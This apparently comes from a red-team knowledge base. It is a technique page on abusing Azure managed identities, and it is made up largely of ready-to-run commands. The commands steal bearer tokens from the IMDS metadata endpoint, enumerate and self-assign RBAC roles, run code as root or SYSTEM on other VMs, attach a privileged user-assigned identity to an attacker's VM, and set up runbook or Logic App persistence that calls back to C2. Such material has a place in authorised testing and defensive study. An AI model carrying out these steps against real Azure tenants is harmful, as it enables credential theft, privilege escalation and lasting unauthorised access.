---
title: "Azure Managed Identity Abuse"
type: technique
tags: [cloud, azure, entra, managed-identity, imds, privesc, lateral-movement, persistence]
phase: exploitation
date_created: 2026-07-20
date_updated: 2026-07-20
sources: []
---

# Azure Managed Identity Abuse

Attack paths that turn access to an Azure compute resource (VM, App Service, Container, Function) into
control of the Azure resources its **managed identity** is authorised for. Managed identities are
service principals with no stored secret: any code running on the resource can mint a token for them
from the local metadata endpoint, so foothold-on-the-box equals act-as-the-identity.

## Token theft via IMDS

Azure compute exposes a non-routable metadata endpoint, `http://169.254.169.254/`, that returns a
bearer token for the resource's managed identity. Any command execution on the box (RCE, SSH, a
`Run Command`, even an SSRF that reaches it) is enough:

```bash
# VM / VMSS: Metadata:true header, choose the resource (audience) you want a token for
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"   # ARM
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"    # Graph
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"          # Key Vault data plane
# App Service / Functions: use $IDENTITY_ENDPOINT + $IDENTITY_HEADER instead of 169.254.169.254
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

Do not parse the JSON by hand: `az login --identity` authenticates AS the resource's identity from
IMDS, then drive everything with `az`. `az account show` confirms `user.type=servicePrincipal` /
`systemAssignedIdentity`. The token's `oid` is the identity's principalId; `xms_mirid` names the owning
resource. A per-audience token is required (an ARM token cannot read a Key Vault; request a
`vault.azure.net` token separately).

## Privilege escalation via an over-permissioned managed identity

Enumerate what the stolen identity can do, then abuse the widest grant:

```bash
az login --identity
az role assignment list --assignee <mi-oid> --all -o table   # ARM roles (Owner/Contributor/UAA?)
az resource list -o table                                    # what it can see (often MORE than the low-priv user)
```

The identity frequently sees resources the compromised user could not (a Key Vault, storage,
another RG). Common over-privilege and its payoff:

- **Owner / User Access Administrator** (`Microsoft.Authorization/roleAssignments/write`): self-assign
  any role, including a Key Vault **data-plane** role, then read secrets (see the RBAC-vault section in
  [[azure-services-keyvault]]). This is the classic "Owner on the RG that holds a vault -> all its
  secrets".
- **Contributor / Virtual Machine Contributor**: `az vm run-command invoke` executes as SYSTEM/root on
  any VM in scope (creds, pivot) - [[azure-services-virtual-machine]]. On an access-policy Key Vault,
  Contributor can `az keyvault set-policy` itself in.
- **Storage / Key Vault data roles**: read blobs / secrets directly.

## Lateral movement between resources

The identity's token is scoped to whatever RBAC granted it, not to the compromised box. Walk its
access outward: `az storage blob list` / `az keyvault secret list` / `az cosmosdb ...` / `az sql ...`,
`az vm run-command` to hop onto other VMs, container registry pulls, automation account access. One
foothold + a broad identity fans out to every service that identity touches.

## Persistence via managed-identity write access

If the identity can write to automation, keep a foothold without touching users (noisy/high-risk under
most ROEs - gate it):

- **Automation Account / Runbook**: `az automation runbook create|replace-content` + a schedule that
  beacons out - [[azure-services-runbook-and-automation]].
- **Logic App / Function**: add a trigger/action that calls back to C2.
- Deploy new infrastructure via ARM templates if Contributor+.

## User-Assigned Managed Identity (UAMI) misuse

A UAMI is a standalone identity that can be **attached to multiple resources**. If you find a
high-privilege UAMI and control (Contributor on) a resource, attach the UAMI to a resource you own and
mint its token:

```bash
az identity list -o table                                   # find UAMIs + their principalIds
az role assignment list --assignee <uami-principalId> --all  # is it over-privileged?
az vm identity assign -g <rg> -n <my-vm> --identities <uami-resource-id>   # attach to a box you control
# then on that VM: IMDS token for the UAMI (add &client_id=<uami-clientId> / &mi_res_id=<uami-id>)
```

## Tooling

- `az login --identity` (from the compromised resource) - the canonical MI abuse tool; no IMDS-JSON
  hand-parsing.
- `az cli` on Kali: the deb repo rejects Kali's dist codename - install with
  `curl -sL https://aka.ms/InstallAzureCLIDeb | DIST_CODE=bookworm bash`, or run az on the target
  Ubuntu VM where it installs cleanly.
- [[roadtools]] for the Entra directory; `MicroBurst` (`Get-AzPasswords`) to sweep KV/automation/storage
  secrets in one pass; AzureHound for RBAC/Entra attack paths.

Related: [[azure-services-keyvault]], [[azure-services-virtual-machine]], [[azure-ad-iam]],
[[azure-services-runbook-and-automation]], [[imds-cloud-metadata]].

<!-- promoted-slug: mi-abuse-body -->
